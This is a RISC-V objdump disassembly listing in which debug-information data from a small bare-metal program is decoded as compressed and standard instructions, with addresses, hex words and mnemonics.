    11b4:	f00d                	bnez	s0,10d6 <_tbss_end+0x1052>
    11b6:	0000                	unimp
    11b8:	0900                	addi	s0,sp,144
    11ba:	00062dd3          	fadd.s	fs11,fa2,ft0,rdn
    11be:	7400                	ld	s0,40(s0)
    11c0:	9f0d                	subw	a4,a4,a1
    11c2:	0005                	c.nop	1
    11c4:	0900                	addi	s0,sp,144
    11c6:	3dd4                	fld	fa3,184(a1)
    11c8:	0006                	c.slli	zero,0x1
    11ca:	7700                	ld	s0,40(a4)
    11cc:	5f11                	li	t5,-28
    11ce:	626c                	ld	a1,192(a2)
    11d0:	0900                	addi	s0,sp,144
    11d2:	00030fd7          	0x30fd7
    11d6:	7800                	ld	s0,48(s0)
    11d8:	a80d                	j	120a <_tbss_end+0x1186>
    11da:	0001                	nop
    11dc:	0900                	addi	s0,sp,144
    11de:	49da                	lw	s3,148(sp)
    11e0:	0000                	unimp
    11e2:	8800                	0x8800
    11e4:	b90d                	j	e16 <_tbss_end+0xd92>
    11e6:	0001                	nop
    11e8:	0900                	addi	s0,sp,144
    11ea:	0000cedb          	0xcedb
    11ee:	9000                	0x9000
    11f0:	380d                	addiw	a6,a6,-29
    11f2:	0006                	c.slli	zero,0x1
    11f4:	0900                	addi	s0,sp,144
    11f6:	82de                	mv	t0,s7
    11f8:	0004                	0x4
    11fa:	9800                	0x9800
    11fc:	c90d                	beqz	a0,122e <_tbss_end+0x11aa>
    11fe:	0002                	c.slli	zero,0x0
    1200:	0900                	addi	s0,sp,144
    1202:	56e2                	lw	a3,56(sp)
    1204:	0001                	nop
    1206:	a000                	fsd	fs0,0(s0)
    1208:	5a0d                	li	s4,-29
    120a:	0004                	0x4
    120c:	0900                	addi	s0,sp,144
    120e:	4be4                	lw	s1,84(a5)
    1210:	0001                	nop
    1212:	a400                	fsd	fs0,8(s0)
    1214:	cf0d                	beqz	a4,124e <_tbss_end+0x11ca>
    1216:	0002                	c.slli	zero,0x0
    1218:	0900                	addi	s0,sp,144
    121a:	49e5                	li	s3,25
    121c:	0000                	unimp
    121e:	ac00                	fsd	fs0,24(s0)
    1220:	1500                	addi	s0,sp,672
    1222:	00e4                	addi	s1,sp,76
    1224:	0000                	unimp
    1226:	0482                	slli	s1,s1,0x0
    1228:	0000                	unimp
    122a:	8216                	mv	tp,t0
    122c:	0004                	0x4
    122e:	1600                	addi	s0,sp,800
    1230:	0161                	addi	sp,sp,24
    1232:	0000                	unimp
    1234:	6316                	ld	t1,320(sp)
    1236:	0001                	nop
    1238:	1600                	addi	s0,sp,800
    123a:	0049                	c.nop	18
    123c:	0000                	unimp
    123e:	0f00                	addi	s0,sp,912
    1240:	8d08                	0x8d08
    1242:	0004                	0x4
    1244:	0500                	addi	s0,sp,640
    1246:	0482                	slli	s1,s1,0x0
    1248:	0000                	unimp
    124a:	0004b817          	auipc	a6,0x4b
    124e:	4800                	lw	s0,16(s0)
    1250:	02390907          	0x2390907
    1254:	000005bf 00041818 	0x41818000005bf
    125c:	0900                	addi	s0,sp,144
    125e:	0049023b          	addw	tp,s2,tp
    1262:	0000                	unimp
    1264:	1800                	addi	s0,sp,48
    1266:	0195                	addi	gp,gp,5
    1268:	0000                	unimp
    126a:	4009                	c.li	zero,2
    126c:	9402                	jalr	s0
    126e:	0006                	c.slli	zero,0x1
    1270:	0800                	addi	s0,sp,16
    1272:	4918                	lw	a4,16(a0)
    1274:	0002                	c.slli	zero,0x0
    1276:	0900                	addi	s0,sp,144
    1278:	0240                	addi	s0,sp,260
    127a:	0694                	addi	a3,sp,832
    127c:	0000                	unimp
    127e:	1810                	addi	a2,sp,48
    1280:	0202                	slli	tp,tp,0x0
    1282:	0000                	unimp
    1284:	4009                	c.li	zero,2
    1286:	9402                	jalr	s0
    1288:	0006                	c.slli	zero,0x1
    128a:	1800                	addi	s0,sp,48
    128c:	7b18                	ld	a4,48(a4)
    128e:	0004                	0x4
    1290:	0900                	addi	s0,sp,144
    1292:	0242                	slli	tp,tp,0x10
    1294:	0049                	c.nop	18
    1296:	0000                	unimp
    1298:	1820                	addi	s0,sp,56
    129a:	00000027          	0x27
    129e:	4309                	li	t1,2
    12a0:	7f02                	ld	t5,32(sp)
    12a2:	0008                	0x8
    12a4:	2400                	fld	fs0,8(s0)
    12a6:	9718                	0x9718
    12a8:	0004                	0x4
    12aa:	0900                	addi	s0,sp,144
    12ac:	0246                	slli	tp,tp,0x11
    12ae:	0049                	c.nop	18
    12b0:	0000                	unimp
    12b2:	1840                	addi	s0,sp,52
    12b4:	0485                	addi	s1,s1,1
    12b6:	0000                	unimp
    12b8:	4709                	li	a4,2
    12ba:	9402                	jalr	s0
    12bc:	0008                	0x8
    12be:	4800                	lw	s0,16(s0)
    12c0:	9518                	0x9518
    12c2:	09000003          	lb	zero,144(zero) # ffffffffffffd090 <_end+0xffffffff7ffe1e90>
    12c6:	0249                	addi	tp,tp,18
    12c8:	0049                	c.nop	18
    12ca:	0000                	unimp
    12cc:	1850                	addi	a2,sp,52
    12ce:	048d                	addi	s1,s1,3
    12d0:	0000                	unimp
    12d2:	4b09                	li	s6,2
    12d4:	a502                	fsd	ft0,136(sp)
    12d6:	0008                	0x8
    12d8:	5800                	lw	s0,48(s0)
    12da:	ae18                	fsd	fa4,24(a2)
    12dc:	0002                	c.slli	zero,0x0
    12de:	0900                	addi	s0,sp,144
    12e0:	024e                	slli	tp,tp,0x13
    12e2:	000001d3          	fadd.s	ft3,ft0,ft0,rne
    12e6:	1860                	addi	s0,sp,60
    12e8:	00000227          	0x227
    12ec:	4f09                	li	t5,2
    12ee:	4902                	lw	s2,0(sp)
    12f0:	0000                	unimp
    12f2:	6800                	ld	s0,16(s0)
    12f4:	ef18                	sd	a4,24(a4)
    12f6:	0005                	c.nop	1
    12f8:	0900                	addi	s0,sp,144
    12fa:	0250                	addi	a2,sp,260
    12fc:	000001d3          	fadd.s	ft3,ft0,ft0,rne
    1300:	1870                	addi	a2,sp,60
    1302:	03d1                	addi	t2,t2,20
    1304:	0000                	unimp
    1306:	5109                	li	sp,-30
    1308:	ab02                	fsd	ft0,400(sp)
    130a:	0008                	0x8
    130c:	7800                	ld	s0,48(s0)
    130e:	5118                	lw	a4,32(a0)
    1310:	0002                	c.slli	zero,0x0
    1312:	0900                	addi	s0,sp,144
    1314:	0254                	addi	a3,sp,260
    1316:	0049                	c.nop	18
    1318:	0000                	unimp
    131a:	1880                	addi	s0,sp,112
    131c:	01b1                	addi	gp,gp,12
    131e:	0000                	unimp
    1320:	5509                	li	a0,-30
    1322:	6302                	ld	t1,0(sp)
    1324:	0001                	nop
    1326:	8800                	0x8800
    1328:	1118                	addi	a4,sp,160
    132a:	0004                	0x4
    132c:	0900                	addi	s0,sp,144
    132e:	0278                	addi	a4,sp,268
    1330:	085c                	addi	a5,sp,20
    1332:	0000                	unimp
    1334:	1990                	addi	a2,sp,240
    1336:	00000383          	lb	t2,0(zero) # 0 <_tdata_begin>
    133a:	7c09                	lui	s8,0xfffe2
    133c:	f202                	sd	zero,288(sp)
    133e:	0002                	c.slli	zero,0x0
    1340:	f800                	sd	s0,48(s0)
    1342:	1901                	addi	s2,s2,-32
    1344:	0281                	addi	t0,t0,0
    1346:	0000                	unimp
    1348:	7d09                	lui	s10,0xfffe2
    134a:	b302                	fsd	ft0,416(sp)
    134c:	0002                	c.slli	zero,0x0
    134e:	0000                	unimp
    1350:	1902                	slli	s2,s2,0x20
    1352:	0595                	addi	a1,a1,5
    1354:	0000                	unimp
    1356:	8109                	srli	a0,a0,0x2
    1358:	bc02                	fsd	ft0,56(sp)
    135a:	0008                	0x8
    135c:	1800                	addi	s0,sp,48
    135e:	1905                	addi	s2,s2,-31
    1360:	00000137          	lui	sp,0x0
    1364:	8609                	srai	a2,a2,0x2
    1366:	5902                	lw	s2,32(sp)
    1368:	0006                	c.slli	zero,0x1
    136a:	2000                	fld	fs0,0(s0)
    136c:	1905                	addi	s2,s2,-31
    136e:	0112                	slli	sp,sp,0x4
    1370:	0000                	unimp
    1372:	8709                	srai	a4,a4,0x2
    1374:	c802                	sw	zero,16(sp)
    1376:	0008                	0x8
    1378:	3800                	fld	fs0,48(s0)
    137a:	0005                	c.nop	1
    137c:	0464080f          	0x464080f
    1380:	0000                	unimp
    1382:	e415                	bnez	s0,13ae <_tbss_end+0x132a>
    1384:	0000                	unimp
    1386:	e300                	sd	s0,0(a4)
    1388:	0005                	c.nop	1
    138a:	1600                	addi	s0,sp,800
    138c:	0482                	slli	s1,s1,0x0
    138e:	0000                	unimp
    1390:	6116                	ld	sp,320(sp)
    1392:	0001                	nop
    1394:	1600                	addi	s0,sp,800
    1396:	000005e3          	beqz	zero,1ba0 <_tbss_end+0x1b1c>
    139a:	4916                	lw	s2,68(sp)
    139c:	0000                	unimp
    139e:	0000                	unimp
    13a0:	0170080f          	0x170080f
    13a4:	0000                	unimp
    13a6:	05c5080f          	0x5c5080f
    13aa:	0000                	unimp
    13ac:	d915                	beqz	a0,12e0 <_tbss_end+0x125c>
    13ae:	0000                	unimp
    13b0:	0d00                	addi	s0,sp,656
    13b2:	0006                	c.slli	zero,0x1
    13b4:	1600                	addi	s0,sp,800
    13b6:	0482                	slli	s1,s1,0x0
    13b8:	0000                	unimp
    13ba:	6116                	ld	sp,320(sp)
    13bc:	0001                	nop
    13be:	1600                	addi	s0,sp,800
    13c0:	00d9                	addi	ra,ra,22
    13c2:	0000                	unimp
    13c4:	4916                	lw	s2,68(sp)
    13c6:	0000                	unimp
    13c8:	0000                	unimp
    13ca:	05ef080f          	0x5ef080f
    13ce:	0000                	unimp
    13d0:	4915                	li	s2,5
    13d2:	0000                	unimp
    13d4:	2700                	fld	fs0,8(a4)
    13d6:	0006                	c.slli	zero,0x1
    13d8:	1600                	addi	s0,sp,800
    13da:	0482                	slli	s1,s1,0x0
    13dc:	0000                	unimp
    13de:	6116                	ld	sp,320(sp)
    13e0:	0001                	nop
    13e2:	0000                	unimp
    13e4:	0613080f          	0x613080f
    13e8:	0000                	unimp
    13ea:	340a                	fld	fs0,160(sp)
    13ec:	0000                	unimp
    13ee:	3d00                	fld	fs0,56(a0)
    13f0:	0006                	c.slli	zero,0x1
    13f2:	0b00                	addi	s0,sp,400
    13f4:	0078                	addi	a4,sp,12
    13f6:	0000                	unimp
    13f8:	0002                	c.slli	zero,0x0
    13fa:	340a                	fld	fs0,160(sp)
    13fc:	0000                	unimp
    13fe:	4d00                	lw	s0,24(a0)
    1400:	0006                	c.slli	zero,0x1
    1402:	0b00                	addi	s0,sp,400
    1404:	0078                	addi	a4,sp,12
    1406:	0000                	unimp
    1408:	0000                	unimp
    140a:	00044007          	flq	ft0,0(s0) # 1a000 <_tbss_end+0x19f7c>
    140e:	0900                	addi	s0,sp,144
    1410:	011f 033a 0000      	0x33a011f
    1416:	7c1a                	ld	s8,416(sp)
    1418:	0005                	c.nop	1
    141a:	1800                	addi	s0,sp,48
    141c:	2309                	addiw	t1,t1,2
    141e:	8e01                	sub	a2,a2,s0
    1420:	0006                	c.slli	zero,0x1
    1422:	1800                	addi	s0,sp,48
    1424:	0468                	addi	a0,sp,524
    1426:	0000                	unimp
    1428:	2509                	addiw	a0,a0,2
    142a:	8e01                	sub	a2,a2,s0
    142c:	0006                	c.slli	zero,0x1
    142e:	0000                	unimp
    1430:	6718                	ld	a4,8(a4)
    1432:	0002                	c.slli	zero,0x0
    1434:	0900                	addi	s0,sp,144
    1436:	0126                	slli	sp,sp,0x9
    1438:	0049                	c.nop	18
    143a:	0000                	unimp
    143c:	1808                	addi	a0,sp,48
    143e:	043a                	slli	s0,s0,0xe
    1440:	0000                	unimp
    1442:	2709                	addiw	a4,a4,2
    1444:	9401                	srai	s0,s0,0x20
    1446:	0006                	c.slli	zero,0x1
    1448:	1000                	addi	s0,sp,32
    144a:	0f00                	addi	s0,sp,912
    144c:	5908                	lw	a0,48(a0)
    144e:	0006                	c.slli	zero,0x1
    1450:	0f00                	addi	s0,sp,912
    1452:	4d08                	lw	a0,24(a0)
    1454:	0006                	c.slli	zero,0x1
    1456:	1a00                	addi	s0,sp,304
    1458:	001f 0000 090e      	0x90e0000001f
    145e:	06cf013f bf180000 	0xbf18000006cf013f
    1466:	0004                	0x4
    1468:	0900                	addi	s0,sp,144
    146a:	0140                	addi	s0,sp,132
    146c:	000006cf          	fnmadd.s	fa3,ft0,ft0,ft0,rne
    1470:	1800                	addi	s0,sp,48
    1472:	00000507          	0x507
    1476:	4109                	li	sp,2
    1478:	cf01                	beqz	a4,1490 <_tbss_end+0x140c>
    147a:	0006                	c.slli	zero,0x1
    147c:	0600                	addi	s0,sp,768
    147e:	2818                	fld	fa4,16(s0)
    1480:	0005                	c.nop	1
    1482:	0900                	addi	s0,sp,144
    1484:	0142                	slli	sp,sp,0x10
    1486:	0042                	c.slli	zero,0x10
    1488:	0000                	unimp
    148a:	000c                	0xc
    148c:	420a                	lw	tp,128(sp)
    148e:	0000                	unimp
    1490:	df00                	sw	s0,56(a4)
    1492:	0006                	c.slli	zero,0x1
    1494:	0b00                	addi	s0,sp,400
    1496:	0078                	addi	a4,sp,12
    1498:	0000                	unimp
    149a:	0002                	c.slli	zero,0x0
    149c:	5909d81b          	0x5909d81b
    14a0:	e002                	sd	zero,0(sp)
    14a2:	18000007          	0x18000007
    14a6:	0560                	addi	s0,sp,652
    14a8:	0000                	unimp
    14aa:	5b09                	li	s6,-30
    14ac:	5f02                	lw	t5,32(sp)
    14ae:	0000                	unimp
    14b0:	0000                	unimp
    14b2:	0d18                	addi	a4,sp,656
    14b4:	0005                	c.nop	1
    14b6:	0900                	addi	s0,sp,144
    14b8:	025c                	addi	a5,sp,260
    14ba:	00000163          	beqz	zero,14bc <_tbss_end+0x1438>
    14be:	1808                	addi	a0,sp,48
    14c0:	02a1                	addi	t0,t0,8
    14c2:	0000                	unimp
    14c4:	5d09                	li	s10,-30
    14c6:	e002                	sd	zero,0(sp)
    14c8:	10000007          	0x10000007
    14cc:	b818                	fsd	fa4,48(s0)
    14ce:	0005                	c.nop	1
    14d0:	0900                	addi	s0,sp,144
    14d2:	025e                	slli	tp,tp,0x17
    14d4:	01e9                	addi	gp,gp,26
    14d6:	0000                	unimp
    14d8:	182c                	addi	a1,sp,56
    14da:	0212                	slli	tp,tp,0x4
    14dc:	0000                	unimp
    14de:	5f09                	li	t5,-30
    14e0:	4902                	lw	s2,0(sp)
    14e2:	0000                	unimp
    14e4:	5000                	lw	s0,32(s0)
    14e6:	6318                	ld	a4,0(a4)
    14e8:	0004                	0x4
    14ea:	0900                	addi	s0,sp,144
    14ec:	0260                	addi	s0,sp,268
    14ee:	07f0                	addi	a2,sp,972
    14f0:	0000                	unimp
    14f2:	1858                	addi	a4,sp,52
    14f4:	05ce                	slli	a1,a1,0x13
    14f6:	0000                	unimp
    14f8:	6109                	addi	sp,sp,128
    14fa:	9a02                	jalr	s4
    14fc:	0006                	c.slli	zero,0x1
    14fe:	6000                	ld	s0,0(s0)
    1500:	6e18                	ld	a4,24(a2)
    1502:	0004                	0x4
    1504:	0900                	addi	s0,sp,144
    1506:	0262                	slli	tp,tp,0x18
    1508:	0000014b          	fnmsub.s	ft2,ft0,ft0,ft0,rne
    150c:	1870                	addi	a2,sp,60
    150e:	05d9                	addi	a1,a1,22
    1510:	0000                	unimp
    1512:	6309                	lui	t1,0x2
    1514:	4b02                	lw	s6,0(sp)
    1516:	0001                	nop
    1518:	7800                	ld	s0,48(s0)
    151a:	c118                	sw	a4,0(a0)
    151c:	0000                	unimp
    151e:	0900                	addi	s0,sp,144
    1520:	0264                	addi	s1,sp,268
    1522:	0000014b          	fnmsub.s	ft2,ft0,ft0,ft0,rne
    1526:	1880                	addi	s0,sp,112
    1528:	0000058b          	0x58b
    152c:	6509                	lui	a0,0x2
    152e:	f702                	sd	zero,424(sp)
    1530:	88000007          	0x88000007
    1534:	9518                	0x9518
    1536:	0002                	c.slli	zero,0x0
    1538:	0900                	addi	s0,sp,144
    153a:	0266                	slli	tp,tp,0x19
    153c:	00000807          	0x807
    1540:	1890                	addi	a2,sp,112
    1542:	0535                	addi	a0,a0,13
    1544:	0000                	unimp
    1546:	6709                	lui	a4,0x2
    1548:	4902                	lw	s2,0(sp)
    154a:	0000                	unimp
    154c:	a800                	fsd	fs0,16(s0)
    154e:	d218                	sw	a4,32(a2)
    1550:	0001                	nop
    1552:	0900                	addi	s0,sp,144
    1554:	0268                	addi	a0,sp,268
    1556:	0000014b          	fnmsub.s	ft2,ft0,ft0,ft0,rne
    155a:	18ac                	addi	a1,sp,120
    155c:	00aa                	slli	ra,ra,0xa
    155e:	0000                	unimp
    1560:	6909                	lui	s2,0x2
    1562:	4b02                	lw	s6,0(sp)
    1564:	0001                	nop
    1566:	b400                	fsd	fs0,40(s0)
    1568:	c118                	sw	a4,0(a0)
    156a:	0001                	nop
    156c:	0900                	addi	s0,sp,144
    156e:	026a                	slli	tp,tp,0x1a
    1570:	0000014b          	fnmsub.s	ft2,ft0,ft0,ft0,rne
    1574:	18bc                	addi	a5,sp,120
    1576:	0050                	addi	a2,sp,4
    1578:	0000                	unimp
    157a:	6b09                	lui	s6,0x2
    157c:	4b02                	lw	s6,0(sp)
    157e:	0001                	nop
    1580:	c400                	sw	s0,8(s0)
    1582:	5f18                	lw	a4,56(a4)
    1584:	0000                	unimp
    1586:	0900                	addi	s0,sp,144
    1588:	026c                	addi	a1,sp,268
    158a:	0000014b          	fnmsub.s	ft2,ft0,ft0,ft0,rne
    158e:	18cc                	addi	a1,sp,116
    1590:	0416                	slli	s0,s0,0x5
    1592:	0000                	unimp
    1594:	6d09                	lui	s10,0x2
    1596:	4902                	lw	s2,0(sp)
    1598:	0000                	unimp
    159a:	d400                	sw	s0,40(s0)
    159c:	0a00                	addi	s0,sp,272
    159e:	0169                	addi	sp,sp,26
    15a0:	0000                	unimp
    15a2:	07f0                	addi	a2,sp,972
    15a4:	0000                	unimp
    15a6:	0000780b          	0x780b
    15aa:	1900                	addi	s0,sp,176
    15ac:	0200                	addi	s0,sp,256
    15ae:	0708                	addi	a0,sp,896
    15b0:	0070                	addi	a2,sp,12
    15b2:	0000                	unimp
    15b4:	690a                	ld	s2,128(sp)
    15b6:	0001                	nop
    15b8:	0700                	addi	s0,sp,896
    15ba:	0008                	0x8
    15bc:	0b00                	addi	s0,sp,400
    15be:	0078                	addi	a4,sp,12
    15c0:	0000                	unimp
    15c2:	690a0007          	0x690a0007
    15c6:	0001                	nop
    15c8:	1700                	addi	s0,sp,928
    15ca:	0008                	0x8
    15cc:	0b00                	addi	s0,sp,400
    15ce:	0078                	addi	a4,sp,12
    15d0:	0000                	unimp
    15d2:	681c0017          	auipc	zero,0x681c0
    15d6:	0901                	addi	s2,s2,0
    15d8:	0272                	slli	tp,tp,0x1c
    15da:	083c                	addi	a5,sp,24
    15dc:	0000                	unimp
    15de:	7318                	ld	a4,32(a4)
    15e0:	09000003          	lb	zero,144(zero) # 681c1662 <_tbss_end+0x681c15de>
    15e4:	0275                	addi	tp,tp,29
    15e6:	083c                	addi	a5,sp,24
    15e8:	0000                	unimp
    15ea:	1800                	addi	s0,sp,48
    15ec:	0354                	addi	a3,sp,388
    15ee:	0000                	unimp
    15f0:	7609                	lui	a2,0xfffe2
    15f2:	4c02                	lw	s8,0(sp)
    15f4:	0008                	0x8
    15f6:	f000                	sd	s0,32(s0)
    15f8:	0a00                	addi	s0,sp,272
    15fa:	0334                	addi	a3,sp,392
    15fc:	0000                	unimp
    15fe:	084c                	addi	a1,sp,20
    1600:	0000                	unimp
    1602:	0000780b          	0x780b
    1606:	1d00                	addi	s0,sp,688
    1608:	0a00                	addi	s0,sp,272
    160a:	005f 0000 085c      	0x85c0000005f
    1610:	0000                	unimp
    1612:	0000780b          	0x780b
    1616:	1d00                	addi	s0,sp,688
    1618:	1d00                	addi	s0,sp,688
    161a:	0168                	addi	a0,sp,140
    161c:	5709                	li	a4,-30
    161e:	7f02                	ld	t5,32(sp)
    1620:	0008                	0x8
    1622:	1e00                	addi	s0,sp,816
    1624:	04b8                	addi	a4,sp,584
    1626:	0000                	unimp
    1628:	6e09                	lui	t3,0x2
    162a:	df02                	sw	zero,188(sp)
    162c:	0006                	c.slli	zero,0x1
    162e:	1e00                	addi	s0,sp,816
    1630:	05a5                	addi	a1,a1,9
    1632:	0000                	unimp
    1634:	7709                	lui	a4,0xfffe2
    1636:	1702                	slli	a4,a4,0x20
    1638:	0008                	0x8
    163a:	0000                	unimp
    163c:	690a                	ld	s2,128(sp)
    163e:	0001                	nop
    1640:	8f00                	0x8f00
    1642:	0008                	0x8
    1644:	0b00                	addi	s0,sp,400
    1646:	0078                	addi	a4,sp,12
    1648:	0000                	unimp
    164a:	0018                	0x18
    164c:	9f1f 0000 0f00      	0xf0000009f1f
    1652:	8f08                	0x8f08
    1654:	0008                	0x8
    1656:	2000                	fld	fs0,0(s0)
    1658:	08a5                	addi	a7,a7,9
    165a:	0000                	unimp
    165c:	8216                	mv	tp,t0
    165e:	0004                	0x4
    1660:	0000                	unimp
    1662:	089a080f          	0x89a080f
    1666:	0000                	unimp
    1668:	01d3080f          	0x1d3080f
    166c:	0000                	unimp
    166e:	bc20                	fsd	fs0,120(s0)
    1670:	0008                	0x8
    1672:	1600                	addi	s0,sp,800
    1674:	0049                	c.nop	18
    1676:	0000                	unimp
    1678:	0f00                	addi	s0,sp,912
    167a:	c208                	sw	a0,0(a2)
    167c:	0008                	0x8
    167e:	0f00                	addi	s0,sp,912
    1680:	b108                	fsd	fa0,32(a0)
    1682:	0008                	0x8
    1684:	0a00                	addi	s0,sp,272
    1686:	064d                	addi	a2,a2,19
    1688:	0000                	unimp
    168a:	08d8                	addi	a4,sp,84
    168c:	0000                	unimp
    168e:	0000780b          	0x780b
    1692:	0200                	addi	s0,sp,256
    1694:	2100                	fld	fs0,0(a0)
    1696:	0549                	addi	a0,a0,18
    1698:	0000                	unimp
    169a:	fe09                	bnez	a2,15b4 <_tbss_end+0x1530>
    169c:	8202                	jr	tp
    169e:	0004                	0x4
    16a0:	2100                	fld	fs0,0(a0)
    16a2:	0542                	slli	a0,a0,0x10
    16a4:	0000                	unimp
    16a6:	ff09                	bnez	a4,15c0 <_tbss_end+0x153c>
    16a8:	8802                	jr	a6
    16aa:	0004                	0x4
    16ac:	0600                	addi	s0,sp,768
    16ae:	06e2                	slli	a3,a3,0x18
    16b0:	0000                	unimp
    16b2:	280a                	fld	fa6,128(sp)
    16b4:	000008fb          	0x8fb
    16b8:	0822                	slli	a6,a6,0x8
    16ba:	089f 0000 e906      	0xe9060000089f
    16c0:	0006                	c.slli	zero,0x1
    16c2:	0a00                	addi	s0,sp,272
    16c4:	0008f063          	bleu	zero,a7,16c4 <_tbss_end+0x1640>
    16c8:	2300                	fld	fs0,0(a4)
    16ca:	0824                	addi	s1,sp,24
    16cc:	0000                	unimp
    16ce:	0f02                	slli	t5,t5,0x0
    16d0:	0095                	addi	ra,ra,5
    16d2:	0000                	unimp
    16d4:	00088123          	sb	zero,2(a7) # 4002 <_tbss_end+0x3f7e>
    16d8:	0200                	addi	s0,sp,256
    16da:	9510                	0x9510
    16dc:	0000                	unimp
    16de:	0a00                	addi	s0,sp,272
    16e0:	009a                	slli	ra,ra,0x6
    16e2:	0000                	unimp
    16e4:	0932                	slli	s2,s2,0xc
    16e6:	0000                	unimp
    16e8:	0000780b          	0x780b
    16ec:	0100                	addi	s0,sp,128
    16ee:	2400                	fld	fs0,8(s0)
    16f0:	0710                	addi	a2,sp,896
    16f2:	0000                	unimp
    16f4:	2502                	fld	fa0,0(sp)
    16f6:	0922                	slli	s2,s2,0x8
    16f8:	0000                	unimp
    16fa:	0309                	addi	t1,t1,2
    16fc:	b1c0                	fsd	fs0,160(a1)
    16fe:	8001                	srli	s0,s0,0x0
    1700:	0000                	unimp
    1702:	0000                	unimp
    1704:	630a                	ld	t1,128(sp)
    1706:	0001                	nop
    1708:	5700                	lw	s0,40(a4)
    170a:	0009                	c.nop	2
    170c:	0b00                	addi	s0,sp,400
    170e:	0078                	addi	a4,sp,12
    1710:	0000                	unimp
    1712:	0001                	nop
    1714:	0724                	addi	s1,sp,904
    1716:	0008                	0x8
    1718:	0200                	addi	s0,sp,256
    171a:	4726                	lw	a4,72(sp)
    171c:	0009                	c.nop	2
    171e:	0900                	addi	s0,sp,144
    1720:	01b1d003          	lhu	zero,27(gp) # 8000313b <__global_pointer$+0x1b>
    1724:	0080                	addi	s0,sp,64
    1726:	0000                	unimp
    1728:	2500                	fld	fs0,8(a0)
    172a:	0891                	addi	a7,a7,4
    172c:	0000                	unimp
    172e:	c302                	sw	zero,132(sp)
    1730:	6601                	0x6601
    1732:	0000                	unimp
    1734:	e400                	sd	s0,8(s0)
    1736:	0025                	c.nop	9
    1738:	0080                	addi	s0,sp,64
    173a:	0000                	unimp
    173c:	dc00                	sw	s0,56(s0)
    173e:	0000                	unimp
    1740:	0000                	unimp
    1742:	0000                	unimp
    1744:	0100                	addi	s0,sp,128
    1746:	bc9c                	fsd	fa5,56(s1)
    1748:	0009                	c.nop	2
    174a:	2600                	fld	fs0,8(a2)
    174c:	00727473          	csrrci	s0,0x7,4
    1750:	c302                	sw	zero,132(sp)
    1752:	e301                	bnez	a4,1752 <_tbss_end+0x16ce>
    1754:	0005                	c.nop	1
    1756:	0200                	addi	s0,sp,256
    1758:	5891                	li	a7,-28
    175a:	73657227          	0x73657227
    175e:	0200                	addi	s0,sp,256
    1760:	01c5                	addi	gp,gp,17
    1762:	0066                	c.slli	zero,0x19
    1764:	0000                	unimp
    1766:	9102                	jalr	sp
    1768:	2868                	fld	fa0,208(s0)
    176a:	01ee                	slli	gp,gp,0x1b
    176c:	0000                	unimp
    176e:	c602                	sw	zero,12(sp)
    1770:	4901                	li	s2,0
    1772:	0000                	unimp
    1774:	0200                	addi	s0,sp,256
    1776:	6491                	lui	s1,0x4
    1778:	2900                	fld	fs0,16(a0)
    177a:	06c5                	addi	a3,a3,17
    177c:	0000                	unimp
    177e:	0163220b          	0x163220b
    1782:	0000                	unimp
    1784:	259a                	fld	fa1,384(sp)
    1786:	8000                	0x8000
    1788:	0000                	unimp
    178a:	0000                	unimp
    178c:	004a                	c.slli	zero,0x12
    178e:	0000                	unimp
    1790:	0000                	unimp
    1792:	0000                	unimp
    1794:	9c01                	subw	s0,s0,s0
    1796:	0a09                	addi	s4,s4,2
    1798:	0000                	unimp
    179a:	b82a                	fsd	fa0,48(sp)
    179c:	0008                	0x8
    179e:	0200                	addi	s0,sp,256
    17a0:	016301bb          	addw	gp,t1,s6
    17a4:	0000                	unimp
    17a6:	9102                	jalr	sp
    17a8:	2658                	fld	fa4,136(a2)
    17aa:	00637273          	csrrci	tp,0x6,6
    17ae:	bb02                	fsd	ft0,432(sp)
    17b0:	e301                	bnez	a4,17b0 <_tbss_end+0x172c>
    17b2:	0005                	c.nop	1
    17b4:	0200                	addi	s0,sp,256
    17b6:	5091                	li	ra,-28
    17b8:	02006427          	0x2006427
    17bc:	01bd                	addi	gp,gp,15
    17be:	00000163          	beqz	zero,17c0 <_tbss_end+0x173c>
    17c2:	9102                	jalr	sp
    17c4:	0068                	addi	a0,sp,12
    17c6:	3c29                	addiw	s8,s8,-22
    17c8:	0b000007          	0xb000007
    17cc:	4920                	lw	s0,80(a0)
    17ce:	0000                	unimp
    17d0:	2a00                	fld	fs0,16(a2)
    17d2:	0025                	c.nop	9
    17d4:	0080                	addi	s0,sp,64
    17d6:	0000                	unimp
    17d8:	7000                	ld	s0,32(s0)
    17da:	0000                	unimp
    17dc:	0000                	unimp
    17de:	0000                	unimp
    17e0:	0100                	addi	s0,sp,128
    17e2:	639c                	ld	a5,0(a5)
    17e4:	000a                	c.slli	zero,0x2
    17e6:	2600                	fld	fs0,8(a2)
    17e8:	02003173          	csrrc	sp,0x20,zero
    17ec:	05e301af          	0x5e301af
    17f0:	0000                	unimp
    17f2:	9102                	jalr	sp
    17f4:	2658                	fld	fa4,136(a2)
    17f6:	02003273          	csrrc	tp,0x20,zero
    17fa:	05e301af          	0x5e301af
    17fe:	0000                	unimp
    1800:	9102                	jalr	sp
    1802:	2750                	fld	fa2,136(a4)
    1804:	02003163          	0x2003163
    1808:	01b1                	addi	gp,gp,12
    180a:	0034                	addi	a3,sp,8
    180c:	0000                	unimp
    180e:	9102                	jalr	sp
    1810:	3263276f          	jal	a4,33b36 <_tbss_end+0x33ab2>
    1814:	0200                	addi	s0,sp,256
    1816:	01b1                	addi	gp,gp,12
    1818:	0034                	addi	a3,sp,8
    181a:	0000                	unimp
    181c:	9102                	jalr	sp
    181e:	006e                	c.slli	zero,0x1b
    1820:	5629                	li	a2,-22
    1822:	0006                	c.slli	zero,0x1
    1824:	0b00                	addi	s0,sp,400
    1826:	0000aa8f          	0xaa8f
    182a:	dc00                	sw	s0,56(s0)
    182c:	0024                	addi	s1,sp,8
    182e:	0080                	addi	s0,sp,64
    1830:	0000                	unimp
    1832:	4e00                	lw	s0,24(a2)
    1834:	0000                	unimp
    1836:	0000                	unimp
    1838:	0000                	unimp
    183a:	0100                	addi	s0,sp,128
    183c:	ac9c                	fsd	fa5,24(s1)
    183e:	000a                	c.slli	zero,0x2
    1840:	2600                	fld	fs0,8(a2)
    1842:	a7020073          	0xa7020073
    1846:	e301                	bnez	a4,1846 <_tbss_end+0x17c2>
    1848:	0005                	c.nop	1
    184a:	0200                	addi	s0,sp,256
    184c:	5891                	li	a7,-28
    184e:	6e26                	ld	t3,72(sp)
    1850:	0200                	addi	s0,sp,256
    1852:	00aa01a7          	0xaa01a7
    1856:	0000                	unimp
    1858:	9102                	jalr	sp
    185a:	2750                	fld	fa2,136(a4)
    185c:	0070                	addi	a2,sp,12
